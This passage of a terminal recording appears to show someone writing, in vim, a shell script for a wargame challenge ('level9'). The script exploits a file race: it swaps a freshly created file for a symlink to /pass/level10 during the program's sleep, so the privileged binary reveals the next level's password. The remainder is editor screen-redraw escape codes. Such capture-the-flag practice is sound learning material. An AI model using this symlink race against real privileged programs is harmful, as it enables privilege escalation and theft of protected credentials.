[751.155375, "o", "\u001b[1;1H#!/bin/sh\r\r\n# level9 race: the binary creates the file as euid=level10, stats it (uid must\r\r\n# be 1010), writes the message, prints \"Write Ok\" and sleeps 2 seconds before\r\r\n# it reopens the file and prints it. In that window we swap the file for a\r\r\n# symlink to /pass/level10: we own the 777 directory, so we may unlink the\r\r\n# level10-owned file the binary just made.\r\r\nD=/dev/shm/l9race\r\r\nrm -rf $D\r\r\nmkdir $D\r\r\nchmod 777 $D\r\r\n/levels/level9 $D/F MAGIC > $D/out 2>&1 &\r\r\nsleep 1\r\r\nrm -f $D/F\r\r\nln -s /pass/level10 $D/F\r\r\nwait\r\r\ncat $D/out\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[32;1H~                                                                                                   \u001b[33;1H~                                                                                                   \u001b[34;1H~                                                                                                   \u001b[35;1H~                                                                                                   \u001b[36;1H~                                                                                                   \u001b[37;1H~                                                                                                   \u001b[38;1H~                                                                                                   \u001b[39;1H~                                                                                                   \u001b[m\u001b[40;83H1,1\u001b[11CAll\u001b[1;1H\u001b[?12l\u001b[?25h"]
[763.037057, "o", "\u0007\u001b[?25l\u001b[40;1H\u001b[K\u001b[40;1H:set noai nocin nosi indentexpr=\r\u001b[82C1,1\u001b[11CAll\u001b[1;1H\u001b[?12l\u001b[?25h\u001b[?25l\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b